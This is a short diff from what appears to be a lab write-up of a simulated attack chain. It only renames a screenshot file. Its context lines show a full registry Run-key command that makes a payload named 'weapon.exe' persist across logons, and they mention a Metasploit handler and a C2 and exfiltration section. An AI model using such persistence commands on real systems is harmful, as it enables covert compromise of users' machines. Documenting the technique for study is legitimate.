@@ -57,7 +57,7 @@ Hosted the payload using a Python-based web server and initiated a Metasploit mu
 Established a boot-persistent mechanism by forcing the payload to run automatically upon user authentication via the Windows Registry.
 > `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "weapon.exe" /t REG_SZ /d "C:\Users\zeid4\OneDrive\Desktop\weapon.exe" /f`
 
-![Registry Persistence Setup](images/persistence.PNG)
+![Registry Persistence Setup](images/persistance.PNG)
 *Alternative Text: Command prompt showing the successful addition of the run key to the Windows Registry.*
 
 ### 5. Command & Control (C2) & Exfiltration
